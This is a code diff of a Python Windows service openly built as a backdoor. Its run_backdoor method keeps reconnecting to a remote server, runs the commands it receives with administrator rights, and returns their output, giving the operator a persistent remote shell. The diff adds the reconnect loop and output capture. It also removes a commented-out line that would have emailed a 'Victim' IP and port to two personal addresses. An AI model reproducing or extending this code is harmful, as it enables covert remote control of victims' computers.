@@ -1,10 +1,10 @@
 from local_libs import service
-from local_libs.mail import Email
 from local_libs.config import Config
 import servicemanager
 import sys
 
 import os
+import time
 import socket
 import subprocess
 import win32comext.shell.shell as shell
@@ -43,33 +43,47 @@ class Main(service.WinService):
     def start(self):
         self.is_running = True
         self.log("Service started")
-        # self.email.send("dobrioglo0709@outlook.com", "dobrioglo07092006@gmail.com", "Victim",
-        #                 f"IP: {self.ip}\nPORT: {self.port}")
+
+    def connect_to_server(self):
+        while True:
+            try:
+                self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                self.s.connect((self.server_ip, self.server_port))
+                break
+            except:
+                continue
 
     def run_backdoor(self):
-        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.s.connect((self.server_ip, self.server_port))
+        self.connect_to_server()
 
         while True:
-            received_command = self.s.recv(1024 * 4).decode()
-            self.handle_command(received_command)
+            try:
+                received_command = self.s.recv(1024 * 4).decode("utf-8")
+                self.handle_command(received_command)
+            except ConnectionError:
+                self.connect_to_server()
+            except socket.error:
+                continue
 
     def handle_command(self, command):
         if command == "start shell":
-            self.s.send(f"{os.getcwd()} >> ".encode())
+            self.s.send(f"{os.getcwd()} >> ".encode("utf-8"))
         elif command == "hello":
             self.s.send("hello")
         elif command[:2] == "cd":
-            os.chdir(command[3:])
-            self.s.send(f"{os.getcwd()} >> ".encode())
+            try:
+                os.chdir(command[3:])
+                self.s.send(f"{os.getcwd()} >> ".encode("utf-8"))
+            except Exception as error:
+                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode("utf-8"))
         else:
             try:
                 self.execute_admin_cmd(command)
-                # cmd_output = self.get_cmd_output()
-                cmd_output = ""
-                self.s.send(f"{cmd_output}\nSuccessfully executed\n{os.getcwd()} >> ".encode())
+                time.sleep(0.5)
+                cmd_output = self.get_cmd_output()
+                self.s.send(f"{cmd_output}\nSuccessfully executed\n{os.getcwd()} >> ".encode("utf-8"))
             except Exception as error:
-                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode())
+                self.s.send(f"Error: {error}\n{os.getcwd()} >> ".encode("utf-8"))
 
     def execute_user_cmd(self, command):
         console_session_id = win32ts.WTSGetActiveConsoleSessionId()
@@ -97,11 +111,8 @@ class Main(service.WinService):
                              lpParameters=fr"/c {command} > {self.commands_log_filepath}")
 
     def get_cmd_output(self):
-        output = ""
-        with open(self.commands_log_filepath, "w+") as f:
-            output = f.read()
-            f.write("")
-        return output
+        with open(self.commands_log_filepath) as f:
+            return f.read()
 
     def main(self):
         self.run_backdoor()
@@ -109,6 +120,7 @@ class Main(service.WinService):
     def stop(self):
         self.is_running = False
         self.log("Service stopped")
+        self.s.close()
 
 
 if __name__ == '__main__':
